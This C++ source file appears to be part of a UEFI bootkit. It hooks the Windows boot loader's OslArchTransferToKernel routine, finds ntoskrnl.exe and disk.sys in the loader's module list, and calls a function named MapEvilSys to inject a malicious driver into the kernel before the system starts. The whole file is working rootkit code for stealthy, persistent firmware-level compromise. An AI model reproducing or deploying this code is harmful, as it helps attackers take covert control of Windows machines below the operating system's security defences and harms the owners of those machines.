#include "OslArchTransferToKernel.hpp"

#include "nt_helper.hpp"
#include "TrampolineHook.hpp"
#include "Mapper.hpp"

extern "C" {
    #include <Uefi.h>
    #include <Library/UefiLib.h>
    #include <Library/UefiBootServicesTableLib.h>
    #include <Library/UefiRuntimeServicesTableLib.h>
    #include <Library/DevicePathLib.h>
    #include <Library/MemoryAllocationLib.h>
}


typedef void (EFIAPI* OslArchTransferToKernel_t)(PPARAMETER_BLOCK LoaderBlock, VOID* Entry);

OslArchTransferToKernel_t orig_OslArchTransferToKernel;
unsigned char orig_OslArchTransferToKernel_bytes[14];

void EFIAPI hk_OslArchTransferToKernel(PPARAMETER_BLOCK LoaderBlock, VOID* Entry)
{
    Hook::TrampolineUnhookX64((void*)orig_OslArchTransferToKernel,(void*)orig_OslArchTransferToKernel_bytes); //unhook

    auto GetLoadedModule = [](LIST_ENTRY* LoadOrderListHead, CHAR16* ModuleName) -> PKLDR_DATA_TABLE_ENTRY {
        if(LoadOrderListHead == nullptr || ModuleName == nullptr) return nullptr;
        for(LIST_ENTRY* entry = LoadOrderListHead->ForwardLink; entry != LoadOrderListHead; entry = entry->ForwardLink)
        {
            PKLDR_DATA_TABLE_ENTRY LoadedModule = CONTAINING_RECORD(entry,KLDR_DATA_TABLE_ENTRY,InLoadOrderLinks);
            if(LoadedModule && (StrnCmp(ModuleName,LoadedModule->BaseImageName.Buffer,LoadedModule->BaseImageName.Length) == 0)){
                return LoadedModule;
            }
        }
        return nullptr;
    };

    auto Ntoskrnl = GetLoadedModule(&LoaderBlock->LoadOrderListHead,(CHAR16*)L"ntoskrnl.exe");
    auto Module = GetLoadedModule(&LoaderBlock->LoadOrderListHead,(CHAR16*)L"disk.sys");
    if(Ntoskrnl && Module)
    {
        Mapper::MapEvilSys(Ntoskrnl,Module);
    }
    return orig_OslArchTransferToKernel(LoaderBlock,Entry);
}

void Runtime::HookOslArchTransferToKernel(void *addr)
{
    orig_OslArchTransferToKernel = (OslArchTransferToKernel_t)addr;
    Hook::TrampolineHookX64(addr,(void*)&hk_OslArchTransferToKernel,(void*)orig_OslArchTransferToKernel_bytes);
}